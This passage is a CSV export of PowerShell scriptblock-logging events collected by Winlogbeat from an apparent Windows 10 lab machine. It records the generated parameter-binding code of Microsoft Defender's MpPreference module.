        if ($PSBoundParameters.ContainsKey('ControlledFolderAccessProtectedFolders')) {
          [object]$__cmdletization_value = ${ControlledFolderAccessProtectedFolders}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessProtectedFolders'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessProtectedFolders'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_Ids')) {
          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_Ids}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Ids'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Ids'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_Actions')) {
          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_Actions}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent =",7,20,"-","-","-","-","-","-","-","-","-","-","-","S-1-5-21-504783269-3310020698-1149228630-1001","-","-","{1f14668e-e63b-0001-fad2-141f3be6d801}",wineventlog,"Microsoft-Windows-PowerShell/Operational",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4104,"-","-","-","-","-","-","On create calls","8,136","5,916","{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","Microsoft-Windows-PowerShell",3336,"Execute a Remote Command",CEO,"S-1-5-21-504783269-3310020698-1149228630-1001",vagrant,User,1
"Oct 23, 2022 @ 17:00:34.291",ZnkSBIQByII7dpeEiBwm,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","Execute a Remote Command",process,4104,"Oct 23, 2022 @ 17:00:34.648","Oct 23, 2022 @ 17:00:34.204",event,"-","Microsoft-Windows-PowerShell",info,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",warning,"Creating Scriptblock text (8 of 20):
 $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('EnableLowCpuPriority')) {
          [object]$__cmdletization_value = ${EnableLowCpuPriority}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableLowCpuPriority'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableLowCpuPriority'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('EnableFileHashComputation')) {
          [object]$__cmdletization_value = ${EnableFileHashComputation}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFileHashComputation'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFileHashComputation'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('EnableFullScanOnBatteryPower')) {
          [object]$__cmdletization_value = ${EnableFullScanOnBatteryPower}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFullScanOnBatteryPower'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFullScanOnBatteryPower'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ProxyPacUrl')) {
          [object]$__cmdletization_value = ${ProxyPacUrl}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyPacUrl'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyPacUrl'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ProxyServer')) {
          [object]$__cmdletization_value = ${ProxyServer}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyServer'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyServer'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ProxyBypass')) {
          [object]$__cmdletization_value = ${ProxyBypass}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyBypass'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyBypass'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ForceUseProxyOnly')) {
          [object]$__cmdletization_value = ${ForceUseProxyOnly}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ForceUseProxyOnly'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ForceUseProxyOnly'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableTlsParsing')) {
          [object]$__cmdletization_value = ${DisableTlsParsing}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTlsParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTlsParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableHttpParsing')) {
          [object]$__cmdletization_value = ${DisableHttpParsing}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableHttpParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableHttpParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableDnsParsing')) {
          [object]$__cmdletization_value = ${DisableDnsParsing}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDnsParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDnsParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableDnsOverTcpParsing')) {
          [object]$__cmdletization_value = ${DisableDnsOverTcpParsing}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDnsOverTcpParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDnsOverTcpParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableSshParsing')) {
          [object]$__cmdletization_value = ${DisableSshParsing}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableSshParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableSshParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('PlatformUpdatesChannel')) {
          [object]$__cmdletization_value = ${PlatformUpdatesChannel}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PlatformUpdatesChannel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.UpdatesChannelType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PlatformUpdatesChannel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.UpdatesChannelType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('EngineUpdatesChannel')) {
          [object]$__cmdletization_value = ${EngineUpdatesChannel}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EngineUpdatesChannel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.UpdatesChannelType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EngineUpdatesChannel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.UpdatesChannelType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DefinitionUpdatesChannel')) {
          [object]$__cmdletization_value = ${DefinitionUpdatesChannel}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefinitionUpdatesChannel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.

ScriptBlock ID: f825ae19-44cf-4ba7-981f-597df47e6edc
Path: ","f825ae19-44cf-4ba7-981f-597df47e6edc"," $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('EnableLowCpuPriority')) {
          [object]$__cmdletization_value = ${EnableLowCpuPriority}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableLowCpuPriority'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableLowCpuPriority'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('EnableFileHashComputation')) {
          [object]$__cmdletization_value = ${EnableFileHashComputation}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFileHashComputation'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFileHashComputation'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('EnableFullScanOnBatteryPower')) {
          [object]$__cmdletization_value = ${EnableFullScanOnBatteryPower}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFullScanOnBatteryPower'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFullScanOnBatteryPower'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ProxyPacUrl')) {
          [object]$__cmdletization_value = ${ProxyPacUrl}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyPacUrl'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyPacUrl'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ProxyServer')) {
          [object]$__cmdletization_value = ${ProxyServer}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyServer'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyServer'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ProxyBypass')) {
          [object]$__cmdletization_value = ${ProxyBypass}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyBypass'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyBypass'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ForceUseProxyOnly')) {
          [object]$__cmdletization_value = ${ForceUseProxyOnly}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ForceUseProxyOnly'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ForceUseProxyOnly'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableTlsParsing')) {
          [object]$__cmdletization_value = ${DisableTlsParsing}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTlsParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTlsParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableHttpParsing')) {
          [object]$__cmdletization_value = ${DisableHttpParsing}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableHttpParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableHttpParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableDnsParsing')) {
          [object]$__cmdletization_value = ${DisableDnsParsing}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDnsParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDnsParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableDnsOverTcpParsing')) {
          [object]$__cmdletization_value = ${DisableDnsOverTcpParsing}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDnsOverTcpParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDnsOverTcpParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableSshParsing')) {
          [object]$__cmdletization_value = ${DisableSshParsing}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableSshParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableSshParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('PlatformUpdatesChannel')) {
          [object]$__cmdletization_value = ${PlatformUpdatesChannel}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PlatformUpdatesChannel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.UpdatesChannelType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PlatformUpdatesChannel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.UpdatesChannelType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('EngineUpdatesChannel')) {
          [object]$__cmdletization_value = ${EngineUpdatesChannel}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EngineUpdatesChannel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.UpdatesChannelType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EngineUpdatesChannel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.UpdatesChannelType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DefinitionUpdatesChannel')) {
          [object]$__cmdletization_value = ${DefinitionUpdatesChannel}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefinitionUpdatesChannel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.",8,20,"-","-","-","-","-","-","-","-","-","-","-","S-1-5-21-504783269-3310020698-1149228630-1001","-","-","{1f14668e-e63b-0001-fad2-141f3be6d801}",wineventlog,"Microsoft-Windows-PowerShell/Operational",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4104,"-","-","-","-","-","-","On create calls","8,136","5,916","{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","Microsoft-Windows-PowerShell",3337,"Execute a Remote Command",CEO,"S-1-5-21-504783269-3310020698-1149228630-1001",vagrant,User,1
"Oct 23, 2022 @ 17:00:34.291",Z3kSBIQByII7dpeEiBwm,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","Execute a Remote Command",process,4104,"Oct 23, 2022 @ 17:00:34.648","Oct 23, 2022 @ 17:00:34.205",event,"-","Microsoft-Windows-PowerShell",info,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",warning,"Creating Scriptblock text (9 of 20):
GeneratedTypes.MpPreference.UpdatesChannelType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
